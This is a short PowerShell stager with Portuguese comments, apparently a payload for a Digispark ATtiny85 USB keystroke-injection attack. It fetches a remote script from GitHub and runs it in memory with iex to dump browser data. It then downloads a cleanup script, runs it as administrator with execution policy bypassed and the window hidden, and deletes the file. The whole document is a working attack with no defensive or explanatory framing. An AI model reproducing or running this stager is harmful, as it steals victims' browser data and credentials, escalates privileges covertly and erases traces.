# BAIXA DUMP BROWSERS DATA E DPS BAIXA CLEANUP. 

# 1. Executa browsers.ps1 (sem elevação)
iex (irm https://github.com/gsfv/digisparkattiny85/raw/refs/heads/main/browsers.ps1 -UseBasicParsing)

# 1. Baixa o script cleanup.ps1 e salva em um arquivo real no TEMP
$cleanupPath = "$env:TEMP\cleanup.ps1"
Invoke-WebRequest -Uri 'https://github.com/gsfv/digisparkattiny85/raw/refs/heads/main/cleanup.ps1' -OutFile $cleanupPath -UseBasicParsing

# 2. Executa o arquivo .ps1 como Administrador
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$cleanupPath`"" -Verb RunAs

# (Opcional) Aguarda um pouco e depois apaga o arquivo
Start-Sleep -Seconds 5
Remove-Item $cleanupPath -Force -ErrorAction SilentlyContinue
